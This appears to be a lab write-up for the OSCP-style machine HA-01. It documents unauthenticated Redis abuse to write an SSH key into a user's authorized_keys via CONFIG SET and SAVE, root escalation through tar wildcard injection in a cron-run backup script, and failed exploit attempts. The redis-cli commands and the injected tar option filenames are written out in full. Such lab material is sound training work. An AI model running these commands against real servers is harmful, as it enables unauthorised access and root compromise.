---
type: machine-overview
project: OSCP-Exam-PoC
machine: HA-01
difficulty: Hard
platform: Linux
status: completed
initial_user: devops
initial_access: Redis unauthenticated administration
privilege_escalation: Cron job with tar wildcard injection
services:
  - Redis
  - SSH
tags:
  - oscp
  - hard
  - redis
  - ssh
  - rdb-persistence
  - authorized-keys
  - cron
  - tar-wildcard-injection
user_flag_submitted: true
root_flag_submitted: true
---
# HA-01 — Machine Overview

> **Flag completion:** User and root flags obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Machine Summary

HA-01 is a Linux privilege-escalation challenge exposed through two services:

- **Redis:** Unauthenticated Redis administration.
    
- **SSH:** Remote Linux access.
    

The successful attack chain used Redis persistence to write an SSH public key into the `devops` account's `authorized_keys` file. This provided SSH access as `devops`.

Privilege escalation was then achieved through a root-owned cron job that executed a backup script using an unquoted wildcard. Because `devops` controlled the directory being archived, GNU tar wildcard option injection allowed a command to execute as root.

**Final attack chain:**

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/ha-01-attack-chain-mobile.svg" />
    <img src="/diagrams/ha-01-attack-chain.svg" alt="HA-01 11 original summary stages; the SSH key write, cron privilege escalation and root flag evidence are preserved." width="760" height="1963" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 11 stages of the successful Redis → SSH → cron/tar path, with the original detailed chains below. Root command execution was established through flag retrieval; no interactive root shell was documented.</figcaption>
</figure>

## 2. Target Information

The challenge used several disposable instances. The target IP remained `x.x.x.x`, while the externally exposed ports changed after instance expiration.

|Instance|Redis|SSH|Status|
|---|---|---|---|
|Initial|`PORT_P`|`PORT_D`|Expired|
|Replacement|`PORT_E`|`PORT_B`|Expired|
|Later instance|`PORT_G`|`PORT_F`|Used for the successful foothold and privilege escalation|

The SSH username supplied by the challenge was `user`, but filesystem evidence identified `devops` as the intended account.

### Service identification

The initial Nmap command was:

```
nmap -n -Pn -sV -p PORT_P,PORT_D --reason x.x.x.x
```

Relevant output:

```
PORT      STATE SERVICE VERSION
PORT_D/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
PORT_P/tcp open  redis   Redis key-value store
```

Redis reported the following internal environment information:

```
redis_version:7.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:ae4d7c971a948f0
redis_mode:standalone
os:Linux 6.8.0-147-generic x86_64
arch_bits:64
gcc_version:12.2.0
process_id:21
tcp_port:6379
executable:/redis-server
config_file:/etc/oscp-redis.conf
```

The external port was forwarded to Redis's internal listening port `6379`.

## 3. Instructor Hints and Constraints

The instructor supplied the following information:

- Use Nmap `-sV` to identify the exposed services.
    
- Only SSH and Redis are exposed.
    
- Redis is unauthenticated.
    
- Candidate Linux account names:
    

```
root
admin
ubuntu
debian
deploy
redis
cache
backup
svc
service
operator
sysadmin
git
jenkins
oracle
devops
postgres
www-data
app
maintenance
```

The exam prohibited brute-force attacks.

The username list was useful for targeted account and filesystem enumeration. It was not a password list.

The significant candidate was `devops`, identified through filesystem evidence rather than password guessing.

## 4. Initial Redis Findings

Redis exposed substantial administrative functionality without authentication.

The original instance returned:

```
user default on nopass ~* &* +@all
```

Meaning:

|Setting|Meaning|
|---|---|
|`on`|Redis user enabled|
|`nopass`|No password required|
|`~*`|Access to all keys|
|`&*`|Access to all Pub/Sub channels|
|`+@all`|All Redis command categories permitted|

Other relevant configuration findings:

|Redis setting|Value|
|---|---|
|`protected-mode`|`no`|
|`bind`|`0.0.0.0`|
|`dir`|`/tmp`|
|`dbfilename`|`dump.rdb`|
|`save`|Empty|
|`appendonly`|`no`|
|`logfile`|`/tmp/redis.log`|
|`aclfile`|Empty|

Runtime configuration changes were accepted:

```
CONFIG SET dir /tmp
CONFIG SET dbfilename dump.rdb
```

Redis persistence could also be triggered manually with:

```
SAVE
```

The empty `save` setting disabled automatic snapshots, not explicitly requested snapshots.

### Canary discovery

Initial database enumeration found one key:

```
build:token
```

Its value was:

```
IT{FLAG-SECRET}}
```

This was a false flag. It was not submitted as the machine flag.

## 5. Successful Initial Access

### Identify the intended account

The instructor's username hints were used to test candidate home-directory paths through Redis's `CONFIG SET dir` behavior.

The later instance produced these important results:

|Path|Result|
|---|---|
|`/root/.ssh`|Permission denied|
|`/home/root`|No such file or directory|
|`/home/operator`|No such file or directory|
|`/home/sysadmin`|No such file or directory|
|`/home/git`|No such file or directory|
|`/home/jenkins`|No such file or directory|
|`/home/oracle`|No such file or directory|
|`/home/devops`|`OK`|
|`/home/postgres`|No such file or directory|
|`/home/www-data`|No such file or directory|
|`/home/app`|No such file or directory|
|`/home/maintenance`|No such file or directory|

The decisive result was:

```
CONFIG SET dir /home/devops
OK
```

Then:

```
CONFIG SET dir /home/devops/.ssh
OK
```

This established that both the home directory and its `.ssh` directory were accessible to Redis.

### Confirm filesystem write permission

A harmless test filename was used:

```
CONFIG SET dir /home/devops/.ssh
CONFIG SET dbfilename ha01-write-probe.rdb
SAVE
```

The result was:

```
OK
```

This confirmed that Redis could write a snapshot in the SSH directory.

The test configuration was restored to:

```
CONFIG SET dir /tmp
CONFIG SET dbfilename dump.rdb
```

### Redis persistence to SSH access

An Ed25519 key pair was generated locally on Kali for the `devops` account.

The public key was stored in Redis with newline padding:

```
PUBKEY=$(cat ~/Desktop/HA01-keys/devops.pub)
KEY_CONTENT=$(printf '\n\n%s\n\n' "$PUBKEY")
```

Redis was then configured to write its RDB snapshot into the SSH directory using the `authorized_keys` filename:

```
redis-cli -h x.x.x.x -p PORT_G CONFIG SET dir /home/devops/.ssh

redis-cli -h x.x.x.x -p PORT_G CONFIG SET dbfilename authorized_keys

redis-cli -h x.x.x.x -p PORT_G SET ha01_ssh_key "$KEY_CONTENT"

redis-cli -h x.x.x.x -p PORT_G SAVE
```

The snapshot write succeeded.

SSH access was then established as `devops` using the corresponding private key and the active instance's SSH port.

**Result:** Linux access as `devops` was obtained. The investigation proceeded to privilege escalation.

The full commands and evidence belong in [[Difficulty Levels/Hard/HA-01/user]].

## 6. Failed and Abandoned Approaches

Several investigation branches were explored before the successful persistence-to-SSH route was established.

They are retained here because they explain the decisions made during the challenge.

|Approach|Finding|Final assessment|
|---|---|---|
|Redis canary key|Returned a decoy flag|False lead|
|Redis RDB/SSH-key technique|Eventually succeeded|Successful initial access|
|CVE-2025-49844 — RediShell|Saneki PoC failed at `Failed to UAF chunkname`|Incompatible target assumptions|
|CVE-2026-23631 — DarkReplica|No matching Redis/libc offset profile available|Abandoned|
|Metasploit replication/module loading|Target accepted replication configuration, but callback never connected|No RCE|
|Netcat callback tests|Initial syntax and port-conflict problems; later high-port test also received no connection|Did not establish reverse connectivity|

### RediShell

The Saneki PoC supported two Redis 8.2.1 builds. HA-01 reported Redis 7.0.15.

A remote connection modification was made, and the Bookworm profile was forced. The execution reached the Lua `check` stage but returned:

```
Failed to UAF chunkname
```

No native code execution occurred.

### DarkReplica

The public repository was cloned and inspected. Its available offset profiles were:

- Redis 8.6.2 Docker.
    
- A specific Redis `latest` Docker image.
    
- An empty example profile.
    

There was no confirmed Redis 7.0.15 profile, and the target Redis/libc ELF binaries were unavailable for offset extraction.

### Metasploit replication module

The module was:

```
exploit/linux/redis/redis_replication_cmd_exec
```

Its `check` method reported the target as vulnerable, but this was only a broad compatibility check.

The target accepted the replication configuration:

```
role:slave
master_host:10.144.220.24
master_port:6379
master_link_status:down
```

No connection reached Kali, so the module was never transferred or executed.

The final working path did not require a reverse callback.

## 7. Successful Privilege Escalation

After obtaining SSH access as `devops`, standard Linux privilege-escalation enumeration was performed.

### Sudo

```
sudo -l
```

Result:

```
-bash: sudo: command not found
```

Sudo was not installed.

### SUID enumeration

Command:

```
find / -type f -perm -4000 -printf '%m %u:%g %p\n' 2>/dev/null | sort
```

The results were standard system binaries:

```
4755 root:root /usr/bin/chfn
4755 root:root /usr/bin/chsh
4755 root:root /usr/bin/gpasswd
4755 root:root /usr/bin/mount
4755 root:root /usr/bin/newgrp
4755 root:root /usr/bin/passwd
4755 root:root /usr/bin/su
4755 root:root /usr/bin/umount
4755 root:root /usr/lib/openssh/ssh-keysign
```

No obvious custom SUID escalation path was found.

### Capabilities

```
getcap -r / 2>/dev/null
```

No capability findings were returned.

### Custom cron job

The key discovery was:

```
/etc/cron.d/maint
```

Its contents:

```
# m h dom mon dow user command
* * * * * root /opt/maint/backup.sh >/dev/null 2>&1
```

The job executes every minute as root.

The invoked script was:

```
#!/bin/sh
# Root-owned maintenance job (runs from cron as root every minute).
# VULNERABLE BY DESIGN: archives the spool with a wildcard, so attacker-supplied
# filenames like '--checkpoint-action=exec=...' are interpreted by tar as flags
# (GTFOBins: tar wildcard injection).
cd /opt/maint/spool 2>/dev/null || exit 0
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The important operation is:

```
tar -czf /opt/maint/backup.tar.gz * 2>/dev/null
```

The wildcard expands to filenames controlled by `devops`. GNU tar interprets specially named files as command-line options.

### Confirm directory control

The spool directory permissions were:

```
drwxr-xr-x 1 devops devops 4096 Nov 3 14:01 /opt/maint/spool
```

A write-permission check returned:

```
WRITABLE
```

All required conditions were present:

|Requirement|Evidence|
|---|---|
|Root executes the backup script|`/etc/cron.d/maint`|
|Script passes an unquoted wildcard to tar|`tar ... *`|
|Attacker controls the wildcard directory|`/opt/maint/spool` owned by `devops`|
|Cron execution frequency|Every minute|

### Tar wildcard injection

The root escalation used two specially named files:

```
--checkpoint=1
--checkpoint-action=exec=sh root-flag.sh
```

A small retrieval script was created in the writable spool directory. It copied `/root/root.txt` into a location readable by `devops`.

The script was created with shell `printf` because `vim`, `vi`, and `nano` were not installed on the target.

The root cron job executed the crafted tar options, allowing the retrieval script to run with root privileges.

The root flag was retrieved successfully.

The detailed exploitation commands and evidence belong in [[Difficulty Levels/Hard/HA-01/root]].

## 8. Final Attack Chain

### Initial access

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/ha-01-initial-access-chain-mobile.svg" />
    <img src="/diagrams/ha-01-initial-access-chain.svg" alt="HA-01 7 original Redis initial-access stages including ACL, filesystem write probe, RDB authorized_keys snapshot and SSH as devops." width="760" height="1339" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 7 original initial-access stages preserved. Redis could write a harmless RDB probe before the padded Ed25519 public key was persisted as <code>authorized_keys</code>; the private key remained on Kali.</figcaption>
</figure>

### Privilege escalation

<figure class="attack-chain-figure">
  <picture>
    <source media="(max-width: 520px)" type="image/svg+xml" srcset="/diagrams/ha-01-privilege-escalation-chain-mobile.svg" />
    <img src="/diagrams/ha-01-privilege-escalation-chain.svg" alt="HA-01 8 original root escalation stages including cron backup.sh, writable spool, GNU tar checkpoint option injection and root flag retrieval." width="760" height="1495" loading="lazy" decoding="async" />
  </picture>
  <figcaption>All 8 original privilege-escalation stages preserved. The root cron job executed the tar checkpoint-injection payload and copied the protected flag to <code>/opt/maint/spool/root.txt</code>. No interactive root shell was demonstrated.</figcaption>
</figure>

## 9. Lessons Learned

1. **Redis administrative access can become OS access.** Unauthenticated access with unrestricted commands is especially dangerous when Redis persistence can write into an SSH account's `.ssh` directory.
    
2. **Directory access is not the same as write access.** The harmless RDB probe established the required write permission before targeting `authorized_keys`.
    
3. **Use the supplied username hints as enumeration candidates.** The `devops` account was identified through its actual home-directory path.
    
4. **Don't mistake a canary for a real flag.** The `build:token` value was explicitly a decoy.
    
5. **Do not mistake a generic Metasploit check for exploit confirmation.** The replication module's check did not establish that the reverse connection or module transfer would work.
    
6. **SUID and sudo are not the only privilege-escalation avenues.** The custom cron job was the actual route to root.
    
7. **Inspect every root-owned scheduled task.** The vulnerable operation was in a short backup script called by a system-wide cron entry.
    
8. **Control over wildcard-expanded filenames can be dangerous.** Unquoted wildcards passed to utilities such as GNU tar can turn filenames into options.
    
9. **Check tool availability on the target.** No text editor was installed, so the retrieval script was created using shell utilities.
    
10. **Separate failed research branches from the successful attack chain.** RediShell, DarkReplica and the Metasploit replication attempt were not part of the final compromise.
    

## 10. Evidence and Related Notes

|File|Scope|
|---|---|
|[[Difficulty Levels/Hard/HA-01/user]]|Redis enumeration, persistence abuse, SSH key injection and `devops` access|
|[[Difficulty Levels/Hard/HA-01/root]]|SUID/cron enumeration, vulnerable backup script, tar wildcard injection and root flag retrieval|
|[[Exam Context/Exam Timeline\|Exam Timeline]]|Machine progression|
|[[Dashboard]]|Overall exam status|

**Final status:** Initial Linux access as `devops` obtained. Root escalation through cron/tar wildcard injection completed. Root flag retrieved successfully.